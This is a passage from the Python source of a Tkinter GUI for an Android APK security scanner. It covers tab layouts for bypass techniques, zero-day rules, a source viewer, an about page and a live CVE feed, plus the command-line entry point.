    for i, bp in enumerate(BYPASS_TECHNIQUES):
        card = make_card(by_inner, px=20, py=16)
        card.pack(fill="x", padx=24, pady=6)
        hdr = tk.Frame(card, bg=BG_CARD)
        hdr.pack(fill="x", pady=(0, 8))
        cc = cat_colors.get(bp["category"], FG2)
        tk.Label(hdr, text=" {} ".format(bp["category"].upper()), font=(MONO, 9, "bold"),
                 bg=cc, fg="#000000" if bp["category"] in ("Auth", "Code") else "#ffffff",
                 padx=8, pady=2).pack(side="left", padx=(0, 10))
        tk.Label(hdr, text=bp["name"], font=(FONT, 13, "bold"), bg=BG_CARD, fg=FG, anchor="w").pack(side="left")
        tk.Label(card, text=bp["desc"], font=(FONT, 11), bg=BG_CARD, fg=FG2, anchor="w", wraplength=900).pack(fill="x", pady=(0, 8))
        tk.Label(card, text="METHODS", font=(FONT, 9, "bold"), bg=BG_CARD, fg=GREEN, anchor="w").pack(fill="x", pady=(0, 2))
        m_text = tk.Text(card, bg=BG3, fg=FG, font=(MONO, 10), height=min(bp["methods"].count("\n") + 1, 6),
                         bd=0, wrap="word", padx=10, pady=8)
        m_text.pack(fill="x", pady=2)
        m_text.insert("1.0", bp["methods"])
        m_text.configure(state="disabled")

    nb.add(by_canvas, text=" \U0001f513 Bypass ")
    _register_scrollable(4, by_canvas, by_inner)

    # ══════════════════════════════════════════════════════════
    #  TAB 5: ZERO-DAY RULES DATABASE + FINDINGS
    # ══════════════════════════════════════════════════════════
    zd_canvas = tk.Canvas(nb, bg=BG, highlightthickness=0, bd=0)
    zd_inner = tk.Frame(zd_canvas, bg=BG)
    zd_sb = ttk.Scrollbar(zd_canvas, orient="vertical", command=zd_canvas.yview)
    zd_canvas.configure(yscrollcommand=zd_sb.set)
    zd_sb.pack(side="right", fill="y"); zd_canvas.pack(fill="both", expand=True)
    zd_cw = zd_canvas.create_window((0, 0), window=zd_inner, anchor="nw")
    zd_inner.bind("<Configure>", lambda e: zd_canvas.configure(scrollregion=zd_canvas.bbox("all")))
    zd_canvas.bind("<Configure>", lambda e: zd_canvas.itemconfig(zd_cw, width=e.width))

    # Extract all 50 ZD rules from RULES list
    ZD_RULES = [r for r in RULES if r["id"].startswith("AV-ZD-")]

    def _build_zeroday_tab(parent, findings):
        """Build the Zero-Day tab: 50 ZD rules reference + scan detections."""
        for w in parent.winfo_children():
            w.destroy()
        PAD = 24

        # ── Header ──
        tk.Label(parent, text="\u26a0\ufe0f  Zero-Day Detection Rules  (AV-ZD-001 \u2014 AV-ZD-075)",
                 font=(FONT, 20, "bold"), bg=BG, fg="#ffffff", anchor="w").pack(fill="x", padx=PAD, pady=(PAD, 4))
        tk.Label(parent, text="{} zero-day detection rules targeting 2025\u20132026 Android attack surfaces".format(len(ZD_RULES)),
                 font=(FONT, 11), bg=BG, fg=FG2, anchor="w").pack(fill="x", padx=PAD, pady=(0, 12))
        tk.Frame(parent, bg=BORDER, height=1).pack(fill="x", padx=PAD, pady=(0, 12))

        # ── Stats summary ──
        zd_crit = sum(1 for r in ZD_RULES if r["sev"] == "CRITICAL")
        zd_high = sum(1 for r in ZD_RULES if r["sev"] == "HIGH")
        zd_med = sum(1 for r in ZD_RULES if r["sev"] == "MEDIUM")
        zd_findings = [f for f in findings if f.id.startswith("AV-ZD-") or f.id.startswith("AV-CVE-")]
        zd_detected = len(zd_findings)

        stats_row = tk.Frame(parent, bg=BG)
        stats_row.pack(fill="x", padx=PAD, pady=(0, 16))
        for label, val, col in [("Total Rules", str(len(ZD_RULES)), ACC),
                                 ("Critical", str(zd_crit), RED),
                                 ("High", str(zd_high), ORANGE),
                                 ("Medium", str(zd_med), YELLOW),
                                 ("\u2622 Detected", str(zd_detected), RED if zd_detected > 0 else GREEN)]:
            sc = make_card(stats_row, px=0, py=10)
            sc.pack(side="left", fill="x", expand=True, padx=4)
            tk.Frame(sc, bg=col, height=3).place(x=0, y=0, relwidth=1.0)
            si = tk.Frame(sc, bg=BG_CARD)
            si.pack(fill="x", padx=14)
            tk.Label(si, text=val, font=(MONO, 22, "bold"), bg=BG_CARD, fg=col).pack()
            tk.Label(si, text=label, font=(FONT, 9, "bold"), bg=BG_CARD, fg=FG2).pack()

        # ── Scan Detections Section (if any) ──
        if zd_findings:
            det_card = make_card(parent, px=20, py=14)
            det_card.pack(fill="x", padx=PAD, pady=(0, 12))
            tk.Label(det_card, text="\U0001f6a8  DETECTED IN CURRENT SCAN  ({} zero-day findings)".format(zd_detected),
                     font=(FONT, 12, "bold"), bg=BG_CARD, fg=RED, anchor="w").pack(fill="x", pady=(0, 8))
            for i, f in enumerate(zd_findings):
                sev_col = SEVC.get(f.severity, FG2)
                row = tk.Frame(det_card, bg=BG3 if i % 2 else BG_CARD)
                row.pack(fill="x", pady=1)
                rbg = BG3 if i % 2 else BG_CARD
                tk.Label(row, text=" {} ".format(f.severity[:4]), font=(MONO, 8, "bold"),
                         bg=sev_col, fg="#000000" if f.severity in ("MEDIUM","LOW") else "#ffffff",
                         padx=4, pady=1).pack(side="left", padx=(4, 6), pady=2)
                tk.Label(row, text=f.id, font=(MONO, 9), bg=rbg, fg=FG3).pack(side="left", padx=(0, 6))
                tk.Label(row, text=f.title, font=(FONT, 10, "bold"), bg=rbg, fg=FG,
                         anchor="w").pack(side="left", fill="x", expand=True)
                hits = len(f.locations) if f.locations else 1
                if hits > 1:
                    tk.Label(row, text="{} hits".format(hits), font=(MONO, 9, "bold"),
                             bg=rbg, fg=ORANGE).pack(side="right", padx=(0, 8))
                tk.Label(row, text="CVSS {:.1f}".format(f.cvss) if isinstance(f.cvss,(int,float)) else "",
                         font=(MONO, 9, "bold"), bg=rbg, fg=sev_col).pack(side="right", padx=(0, 8))
            tk.Frame(parent, bg=BORDER, height=1).pack(fill="x", padx=PAD, pady=(12, 12))

        # ── All 50 ZD Rules Reference ──
        tk.Label(parent, text="\U0001f4d6  ALL 50 ZERO-DAY DETECTION RULES",
                 font=(FONT, 14, "bold"), bg=BG, fg=ACC, anchor="w").pack(fill="x", padx=PAD, pady=(0, 8))
        tk.Label(parent, text="These rules detect novel vulnerability patterns from 2025\u20132026 attack research, "
                 "not covered by legacy SAST tools.",
                 font=(FONT, 10), bg=BG, fg=FG2, anchor="w", wraplength=900).pack(fill="x", padx=PAD, pady=(0, 12))

        # Build a set of detected rule IDs for highlighting
        detected_ids = set(f.id for f in zd_findings)

        for i, rule in enumerate(ZD_RULES):
            sev_col = SEVC.get(rule["sev"], FG2)
            is_detected = rule["id"] in detected_ids
            card = make_card(parent, px=20, py=12)
            card.pack(fill="x", padx=PAD, pady=3)

            # Red left border if detected in scan
            if is_detected:
                tk.Frame(card, bg=RED, width=4).place(x=0, y=0, relheight=1.0)

            # Top accent bar
            tk.Frame(card, bg=sev_col, height=2).place(x=0, y=0, relwidth=1.0)

            # Header row
            hdr = tk.Frame(card, bg=BG_CARD)
            hdr.pack(fill="x", pady=(4, 4))
            # Severity badge
            tk.Label(hdr, text=" {} ".format(rule["sev"][:4]), font=(MONO, 9, "bold"),
                     bg=sev_col, fg="#000000" if rule["sev"] in ("MEDIUM","LOW") else "#ffffff",
                     padx=6, pady=1).pack(side="left", padx=(0, 8))
            # Rule ID
            tk.Label(hdr, text=rule["id"], font=(MONO, 10, "bold"), bg=BG_CARD, fg=ACC).pack(side="left", padx=(0, 10))
            # Rule name
            tk.Label(hdr, text=rule["name"], font=(FONT, 12, "bold"), bg=BG_CARD, fg=FG,
                     anchor="w").pack(side="left", fill="x", expand=True)
            # CVSS score
            tk.Label(hdr, text="CVSS {:.1f}".format(rule.get("cvss", 0)),
                     font=(MONO, 10, "bold"), bg=BG_CARD, fg=sev_col).pack(side="right", padx=(8, 0))
            # Detected badge
            if is_detected:
                tk.Label(hdr, text=" \u2622 FOUND ", font=(MONO, 9, "bold"),
                         bg=RED, fg="#ffffff", padx=6, pady=1).pack(side="right", padx=(0, 8))

            # Metadata
            meta = tk.Frame(card, bg=BG_CARD)
            meta.pack(fill="x", pady=(0, 4))
            tk.Label(meta, text=rule["cwe"], font=(MONO, 9), bg=BG3, fg=ACC,
                     padx=6, pady=1).pack(side="left", padx=(0, 6))
            tk.Label(meta, text="OWASP " + rule.get("owasp", ""), font=(MONO, 9), bg=BG3, fg=PURPLE,
                     padx=6, pady=1).pack(side="left", padx=(0, 6))
            scan_types = ", ".join(rule.get("types", []))
            tk.Label(meta, text="Scans: " + scan_types, font=(MONO, 9), bg=BG3, fg=FG2,
                     padx=6, pady=1).pack(side="left")

            # Description
            tk.Label(card, text=rule["desc"], font=(FONT, 10), bg=BG_CARD, fg=FG2,
                     anchor="w", wraplength=880, justify="left").pack(fill="x", pady=(0, 4))

            # Fix
            fix_fr = tk.Frame(card, bg="#0a1a0a", padx=8, pady=4,
                              highlightbackground="#1a3a1a", highlightthickness=1)
            fix_fr.pack(fill="x")
            tk.Label(fix_fr, text="\u2705 Fix: " + rule["fix"], font=(FONT, 9), bg="#0a1a0a", fg=GREEN,
                     anchor="w", wraplength=860, justify="left").pack(fill="x")

        # Footer
        tk.Frame(parent, bg=BORDER, height=1).pack(fill="x", padx=PAD, pady=(16, 4))
        tk.Label(parent, text="75 Zero-Day Rules (AV-ZD-001\u2013075)  |  22 CVE Discovery Patterns (AV-CVE)  |  {} v{}".format(APP_NAME, VERSION),
                 font=(FONT, 9), bg=BG, fg=FG3, anchor="center").pack(pady=(0, PAD))

    _build_zeroday_tab(zd_inner, [])
    nb.add(zd_canvas, text=" \u26a0\ufe0f Zero-Day (75) ")
    _register_scrollable(5, zd_canvas, zd_inner)

    # ══════════════════════════════════════════════════════════
    #  TAB 6: SOURCE CODE VIEWER
    # ══════════════════════════════════════════════════════════
    source_frame = tk.Frame(nb, bg=BG)
    src_header = tk.Frame(source_frame, bg=BG2, height=36)
    src_header.pack(fill="x")
    src_header.pack_propagate(False)
    tk.Label(src_header, text="  \U0001f4c4  Source Code Viewer  \u2014  Select a file from the tree",
             font=(FONT, 10, "bold"), bg=BG2, fg=ACC, anchor="w").pack(fill="x", padx=8, pady=6)
    ct = scrolledtext.ScrolledText(source_frame, wrap="none", bg=BG2, fg=FG,
                                    font=(MONO, 11), state="disabled", bd=0, padx=12, pady=8)
    ct.pack(fill="both", expand=True)
    ct.tag_configure("keyword", foreground="#ff7b72", font=(MONO, 11, "bold"))
    ct.tag_configure("string", foreground="#a5d6ff")
    ct.tag_configure("comment", foreground="#6a7585", font=(MONO, 11, "italic"))
    ct.tag_configure("type", foreground="#d2a8ff")
    ct.tag_configure("number", foreground="#79c0ff")
    ct.tag_configure("annotation", foreground="#d29922")
    ct.tag_configure("xml_tag", foreground="#7ee787")
    ct.tag_configure("xml_attr", foreground="#d2a8ff")
    nb.add(source_frame, text=" \U0001f4c4 Source ")
    source_tab_idx = 6

    def _syntax_highlight(widget):
        content = widget.get("1.0", "end")
        for kw in ["public", "private", "protected", "static", "final", "void", "class",
                    "interface", "extends", "implements", "import", "package", "return",
                    "new", "if", "else", "for", "while", "try", "catch", "throw", "throws",
                    "switch", "case", "break", "continue", "this", "super", "true", "false", "null"]:
            _tag_pattern(widget, r'\b' + kw + r'\b', "keyword")
        for tp in ["String", "int", "boolean", "long", "double", "float", "byte",
                    "Intent", "Bundle", "Context", "Activity", "Fragment", "View"]:
            _tag_pattern(widget, r'\b' + tp + r'\b', "type")
        _tag_pattern(widget, r'"[^"]*"', "string")
        _tag_pattern(widget, r'//.*$', "comment")
        _tag_pattern(widget, r'@\w+', "annotation")
        _tag_pattern(widget, r'\b\d+\b', "number")
        _tag_pattern(widget, r'</?[\w:]+', "xml_tag")
        _tag_pattern(widget, r'\w+(?==)', "xml_attr")

    def _tag_pattern(widget, pattern, tag):
        content = widget.get("1.0", "end")
        for match in re.finditer(pattern, content, re.MULTILINE):
            start = "1.0+{}c".format(match.start())
            end = "1.0+{}c".format(match.end())
            widget.tag_add(tag, start, end)

    # ══════════════════════════════════════════════════════════
    #  TAB 7: ABOUT
    # ══════════════════════════════════════════════════════════
    about_canvas = tk.Canvas(nb, bg=BG, highlightthickness=0, bd=0)
    about_inner = tk.Frame(about_canvas, bg=BG)
    about_sb = ttk.Scrollbar(about_canvas, orient="vertical", command=about_canvas.yview)
    about_canvas.configure(yscrollcommand=about_sb.set)
    about_sb.pack(side="right", fill="y")
    about_canvas.pack(fill="both", expand=True)
    about_cw = about_canvas.create_window((0, 0), window=about_inner, anchor="nw")
    about_inner.bind("<Configure>", lambda e: about_canvas.configure(scrollregion=about_canvas.bbox("all")))
    about_canvas.bind("<Configure>", lambda e: about_canvas.itemconfig(about_cw, width=e.width))

    # About content
    tk.Label(about_inner, text="", bg=BG).pack(pady=8)
    tk.Label(about_inner, text="\U0001f40d", font=(FONT, 48), bg=BG, fg=ACC).pack()
    tk.Label(about_inner, text="{} v{}".format(APP_NAME, VERSION),
             font=(FONT, 24, "bold"), bg=BG, fg="#ffffff").pack(pady=(8, 2))
    tk.Label(about_inner, text="Android Application Security Scanner",
             font=(FONT, 13), bg=BG, fg=FG2).pack(pady=(0, 24))
    tk.Frame(about_inner, bg=BORDER, height=1).pack(fill="x", padx=80, pady=8)

    about_data = [
        ("Author", AUTHOR),
        ("Engine", "{} SAST Engine v2 + Taint Analysis".format(APP_NAME)),
        ("Rules", "{} pattern-based security rules".format(len(RULES))),
        ("Exploits", "{} exploit techniques with PoC".format(len(EXPLOITS))),
        ("Bypass", "{} bypass techniques".format(len(BYPASS_TECHNIQUES))),
        ("Reports", "HTML, JSON, CSV, SARIF 2.1.0"),
        ("Standards", "OWASP MASVS v2  |  MASTG  |  Mobile Top 10"),
        ("Compliance", "CWE/SANS  |  CVSS 3.1  |  NIST 800-53"),
        ("Regulation", "PCI-DSS  |  GDPR  |  SARIF 2.1.0"),
    ]
    for label, val in about_data:
        row = tk.Frame(about_inner, bg=BG)
        row.pack(fill="x", padx=80, pady=3)
        tk.Label(row, text=label, font=(FONT, 11, "bold"), bg=BG, fg=FG2,
                 anchor="e", width=14).pack(side="left")
        tk.Label(row, text="    " + val, font=(FONT, 11), bg=BG, fg=FG, anchor="w").pack(side="left")

    tk.Frame(about_inner, bg=BORDER, height=1).pack(fill="x", padx=80, pady=16)
    features = [
        "\u2705  Binary AndroidManifest.xml parser (AXML format)",
        "\u2705  DEX bytecode analysis for class and string extraction",
        "\u2705  Inter-procedural taint analysis (source \u2192 sink)",
        "\u2705  Exploit knowledge base with proof-of-concept code",
        "\u2705  Security control bypass techniques database",
        "\u2705  Session auto-save and restore",
        "\u2705  Syntax-highlighted source code viewer",
        "\u2705  REST API server for CI/CD integration",
        "\u2705  100% offline  |  Pure Python  |  Zero dependencies",
    ]
    for feat in features:
        tk.Label(about_inner, text="    " + feat, font=(FONT, 11), bg=BG, fg=FG, anchor="w").pack(fill="x", padx=80, pady=2)

    tk.Label(about_inner, text="", bg=BG).pack(pady=16)
    nb.add(about_canvas, text=" \u2139\ufe0f About ")
    _register_scrollable(7, about_canvas, about_inner)

    # ══════════════════════════════════════════════════════════
    #  TAB 8: LIVE THREAT FEED  (auto-updates with new Android CVEs)
    # ══════════════════════════════════════════════════════════
    feed_canvas = tk.Canvas(nb, bg=BG, highlightthickness=0, bd=0)
    feed_inner = tk.Frame(feed_canvas, bg=BG)
    feed_sb = ttk.Scrollbar(feed_canvas, orient="vertical", command=feed_canvas.yview)
    feed_canvas.configure(yscrollcommand=feed_sb.set)
    feed_sb.pack(side="right", fill="y"); feed_canvas.pack(fill="both", expand=True)
    feed_cw = feed_canvas.create_window((0, 0), window=feed_inner, anchor="nw")
    feed_inner.bind("<Configure>", lambda e: feed_canvas.configure(scrollregion=feed_canvas.bbox("all")))
    feed_canvas.bind("<Configure>", lambda e: feed_canvas.itemconfig(feed_cw, width=e.width))

    feed_status_var = tk.StringVar(value="")
    feed_progress_var = tk.IntVar(value=0)

    def _build_feed_tab(parent, cves=None, rules=None):
        """Build the Live Feed tab content."""
        for w in parent.winfo_children():
            w.destroy()
        PAD = 24

        # Header
        tk.Label(parent, text="\U0001f4e1  Live Threat Feed  \u2014  Auto-Update Android CVEs",
                 font=(FONT, 20, "bold"), bg=BG, fg="#ffffff", anchor="w").pack(fill="x", padx=PAD, pady=(PAD, 4))
        tk.Label(parent, text="Fetches latest Android CVEs from NVD (NIST) & GitHub Advisory DB. "
                 "Auto-generates detection rules and adds them to your scanner.",
                 font=(FONT, 11), bg=BG, fg=FG2, anchor="w", wraplength=900).pack(fill="x", padx=PAD, pady=(0, 12))
        tk.Frame(parent, bg=BORDER, height=1).pack(fill="x", padx=PAD, pady=(0, 12))

        # Control panel
        ctrl_card = make_card(parent, px=20, py=14)
        ctrl_card.pack(fill="x", padx=PAD, pady=(0, 12))

        ctrl_row = tk.Frame(ctrl_card, bg=BG_CARD)
        ctrl_row.pack(fill="x")

        def _do_fetch():
            feed_status_var.set("Fetching from NVD + GitHub Advisory...")
            feed_progress_var.set(0)
            pb_feed.configure(value=0)
            btn_fetch.configure(state="disabled")
            root.update()

            def _progress(pct, msg):
                root.after(0, lambda: feed_progress_var.set(pct))
                root.after(0, lambda: pb_feed.configure(value=pct))
                root.after(0, lambda: feed_status_var.set(msg))

            def _worker():
                try:
                    cve_list = fetch_live_feed(progress_cb=_progress)
                    rules_list = generate_live_rules(cve_list)
                    # Reload into scanner engine
                    global _LIVE_RULES
                    _LIVE_RULES = rules_list
                    root.after(0, lambda: _on_fetch_done(cve_list, rules_list))
                except Exception as e:
                    root.after(0, lambda: feed_status_var.set("Error: {}".format(str(e)[:100])))
                    root.after(0, lambda: btn_fetch.configure(state="normal"))

            threading.Thread(target=_worker, daemon=True).start()

        def _on_fetch_done(cve_list, rules_list):
            btn_fetch.configure(state="normal")
            feed_status_var.set("\u2705 {} CVEs fetched, {} detection rules generated & active!".format(
                len(cve_list), len(rules_list)))
            pb_feed.configure(value=100)
            _build_feed_tab(feed_inner, cves=cve_list, rules=rules_list)

        btn_fetch = tk.Button(ctrl_row, text="\U0001f504  Fetch Latest CVEs", font=(FONT, 11, "bold"),
                              bg=ACC2, fg="#ffffff", bd=0, padx=16, pady=8, cursor="hand2",
                              activebackground=ACC, command=_do_fetch)
        btn_fetch.pack(side="left", padx=(0, 12))

        tk.Label(ctrl_row, text="Sources: NVD (NIST)  |  GitHub Advisory DB  |  Android Security Bulletins",
                 font=(FONT, 9), bg=BG_CARD, fg=FG3).pack(side="left", padx=8)

        # Progress bar
        pb_feed = ttk.Progressbar(ctrl_card, length=400, mode="determinate", variable=feed_progress_var)
        pb_feed.pack(fill="x", pady=(8, 4))
        tk.Label(ctrl_card, textvariable=feed_status_var, font=(FONT, 10), bg=BG_CARD, fg=ACC,
                 anchor="w").pack(fill="x")

        # Last fetch info
        cached = load_cached_feed()
        if cached:
            fetch_time = cached.get("fetched", "Never")[:19].replace("T", " ")
            count = cached.get("count", 0)
            info_card = make_card(parent, px=20, py=10)
            info_card.pack(fill="x", padx=PAD, pady=(0, 12))
            tk.Label(info_card, text="\U0001f4c5  Last Updated: {}  |  {} CVEs in cache  |  {} live rules active".format(
                fetch_time, count, len(_LIVE_RULES)),
                font=(FONT, 10, "bold"), bg=BG_CARD, fg=GREEN, anchor="w").pack(fill="x")

        # Stats row
        if cves is None and cached:
            cves = cached.get("cves", [])
        if rules is None:
            rules = _LIVE_RULES

        if cves:
            stats_row = tk.Frame(parent, bg=BG)
            stats_row.pack(fill="x", padx=PAD, pady=(0, 12))

            total_cves = len(cves)
            crit_cves = sum(1 for c in cves if c.get("sev") == "CRITICAL")
            high_cves = sum(1 for c in cves if c.get("sev") == "HIGH")
            med_cves = sum(1 for c in cves if c.get("sev") == "MEDIUM")

            for label, val, col in [("Total CVEs", str(total_cves), ACC),
                                     ("Critical", str(crit_cves), RED),
                                     ("High", str(high_cves), ORANGE),
                                     ("Medium", str(med_cves), YELLOW),
                                     ("Active Rules", str(len(rules)), GREEN)]:
                sc_card = make_card(stats_row, px=0, py=10)
                sc_card.pack(side="left", fill="x", expand=True, padx=4)
                tk.Frame(sc_card, bg=col, height=3).place(x=0, y=0, relwidth=1.0)
                si = tk.Frame(sc_card, bg=BG_CARD)
                si.pack(fill="x", padx=14)
                tk.Label(si, text=val, font=(MONO, 22, "bold"), bg=BG_CARD, fg=col).pack()
                tk.Label(si, text=label, font=(FONT, 9, "bold"), bg=BG_CARD, fg=FG2).pack()

            # CVEs list
            tk.Label(parent, text="\U0001f6a8  Latest Android CVEs (sorted by CVSS)",
                     font=(FONT, 14, "bold"), bg=BG, fg=ACC, anchor="w").pack(fill="x", padx=PAD, pady=(8, 8))

            for i, cve in enumerate(cves[:50]):
                sev_col = SEVC.get(cve.get("sev", "MEDIUM"), FG2)
                card = make_card(parent, px=16, py=10)
                card.pack(fill="x", padx=PAD, pady=3)
                tk.Frame(card, bg=sev_col, height=2).place(x=0, y=0, relwidth=1.0)

                hdr = tk.Frame(card, bg=BG_CARD)
                hdr.pack(fill="x", pady=(4, 4))

                # Severity badge
                tk.Label(hdr, text=" {} ".format(cve.get("sev", "MED")[:4]),
                         font=(MONO, 8, "bold"), bg=sev_col,
                         fg="#000000" if cve.get("sev") in ("MEDIUM", "LOW") else "#ffffff",
                         padx=4, pady=1).pack(side="left", padx=(0, 8))
                # CVE ID
                tk.Label(hdr, text=cve.get("id", ""), font=(MONO, 10, "bold"),
                         bg=BG_CARD, fg=ACC).pack(side="left", padx=(0, 10))
                # CVSS
                tk.Label(hdr, text="CVSS {:.1f}".format(cve.get("cvss", 0)),
                         font=(MONO, 10, "bold"), bg=BG_CARD, fg=sev_col).pack(side="right", padx=(8, 0))
                # Source
                tk.Label(hdr, text=cve.get("source", ""), font=(MONO, 9),
                         bg=BG3, fg=FG2, padx=6, pady=1).pack(side="right", padx=(0, 8))
                # Published date
                tk.Label(hdr, text=cve.get("published", ""), font=(MONO, 9),
                         bg=BG_CARD, fg=FG3).pack(side="right", padx=(0, 8))
                # CWE
                tk.Label(hdr, text=cve.get("cwe", ""), font=(MONO, 9),
                         bg=BG3, fg=PURPLE, padx=6, pady=1).pack(side="right", padx=(0, 8))

                # Description
                desc = cve.get("desc", "")[:300]
                tk.Label(card, text=desc, font=(FONT, 10), bg=BG_CARD, fg=FG2,
                         anchor="w", wraplength=880, justify="left").pack(fill="x", pady=(0, 2))

            # Generated rules section
            if rules:
                tk.Frame(parent, bg=BORDER, height=1).pack(fill="x", padx=PAD, pady=(16, 12))
                tk.Label(parent, text="\u2699\ufe0f  Auto-Generated Detection Rules ({} active)".format(len(rules)),
                         font=(FONT, 14, "bold"), bg=BG, fg=GREEN, anchor="w").pack(fill="x", padx=PAD, pady=(0, 8))
                tk.Label(parent, text="These rules are auto-generated from fetched CVEs and run during every scan. "
                         "They persist across restarts in ~/.apkviper/live_rules.json",
                         font=(FONT, 10), bg=BG, fg=FG2, anchor="w", wraplength=900).pack(fill="x", padx=PAD, pady=(0, 12))

                for i, rule in enumerate(rules[:30]):
                    sev_col = SEVC.get(rule.get("sev", "MEDIUM"), FG2)
                    row = tk.Frame(parent, bg=BG3 if i % 2 else BG2, padx=16, pady=6)
                    row.pack(fill="x", padx=PAD, pady=1)
                    rbg = BG3 if i % 2 else BG2

                    tk.Label(row, text=" {} ".format(rule.get("sev", "MED")[:4]),
                             font=(MONO, 8, "bold"), bg=sev_col,
                             fg="#000000" if rule.get("sev") in ("MEDIUM", "LOW") else "#ffffff",
                             padx=4, pady=1).pack(side="left", padx=(0, 6))
                    tk.Label(row, text=rule.get("id", ""), font=(MONO, 9, "bold"),
                             bg=rbg, fg=ACC).pack(side="left", padx=(0, 8))
                    tk.Label(row, text=rule.get("name", "")[:80], font=(FONT, 10),
                             bg=rbg, fg=FG, anchor="w").pack(side="left", fill="x", expand=True)
                    tk.Label(row, text=rule.get("cwe", ""), font=(MONO, 9),
                             bg=rbg, fg=PURPLE).pack(side="right", padx=(8, 0))

        elif not cves and not cached:
            # Empty state
            empty = make_card(parent, px=40, py=40)
            empty.pack(fill="x", padx=PAD, pady=40)
            tk.Label(empty, text="\U0001f4e1", font=(FONT, 48), bg=BG_CARD, fg=FG3).pack()
            tk.Label(empty, text="No CVE Data Yet", font=(FONT, 18, "bold"), bg=BG_CARD, fg=FG).pack(pady=(12, 4))
            tk.Label(empty, text="Click 'Fetch Latest CVEs' to download new Android vulnerabilities from NVD & GitHub.\n"
                     "Detection rules will be auto-generated and immediately added to the scanner.",
                     font=(FONT, 11), bg=BG_CARD, fg=FG2, justify="center").pack()

        # Footer
        tk.Frame(parent, bg=BORDER, height=1).pack(fill="x", padx=PAD, pady=(16, 4))
        tk.Label(parent, text="Live Feed Engine  |  Sources: NVD NIST, GitHub Advisory DB  |  "
                 "Auto-generates regex rules from CVE descriptions  |  Persists to ~/.apkviper/",
                 font=(FONT, 9), bg=BG, fg=FG3, anchor="center").pack(pady=(0, PAD))

    _build_feed_tab(feed_inner)
    nb.add(feed_canvas, text=" \U0001f4e1 Live Feed ")
    _register_scrollable(8, feed_canvas, feed_inner)

    # ── Activate global mouse wheel scrolling for all canvas tabs ──
    root.bind_all("<MouseWheel>", _global_scroll)
    root.bind_all("<Button-4>", _global_scroll_up)
    root.bind_all("<Button-5>", _global_scroll_down)

    # ══════════════════════════════════════════════════════════
    #  STATUS BAR (Clean, no clock)
    # ══════════════════════════════════════════════════════════
    sv = tk.StringVar(value="\u25cf  Ready  \u2014  Open an APK to begin security assessment")
    status_bar = tk.Frame(root, bg=BG3, height=32)
    status_bar.pack(fill="x", side="bottom")
    status_bar.pack_propagate(False)
    tk.Label(status_bar, textvariable=sv, bg=BG3, fg=FG2, font=(FONT, 10),
             anchor="w", padx=16).pack(side="left", fill="x", expand=True)
    tk.Label(status_bar, text="{} v{}  |  {} rules  |  darkfox".format(APP_NAME, VERSION, len(RULES)),
             bg=BG3, fg=FG3, font=(FONT, 9), padx=16).pack(side="right")

    root.mainloop()

# ============================================================
#  MAIN
# ============================================================
def main():
    if len(sys.argv) > 1:
        a = sys.argv[1]
        if a == "--server":
            port = 8089
            if "--port" in sys.argv:
                i = sys.argv.index("--port")
                if i + 1 < len(sys.argv):
                    try: port = int(sys.argv[i + 1])
                    except: pass
            start_server(port); return
        if a == "--scan":
            p = argparse.ArgumentParser()
            p.add_argument("--scan", required=True)
            p.add_argument("--format", default="json", choices=["json", "html", "csv", "sarif"])
            p.add_argument("--output", default=None)
            sys.exit(cli_scan(p.parse_args()))
        if a in ("--help", "-h"):
            print("{} v{} - Android Security Assessment".format(APP_NAME, VERSION))
            print("\nUsage:")
            print("  python apkviper.py                          Launch GUI")
            print("  python apkviper.py --scan <apk>             Headless scan")
            print("  python apkviper.py --scan <apk> --format html --output report.html")
            print("  python apkviper.py --scan <apk> --format sarif")
            print("  python apkviper.py --server --port 8089     REST API")
            print("\nFeatures: 125 rules (50 base + 75 zero-day) + taint analysis + exploit DB + bypass techniques")
            print("Formats: json, html, csv, sarif")
            print("Exit: 0=pass, 1=error, 2=critical/high"); return
    launch_gui()

if __name__ == "__main__":
    main()
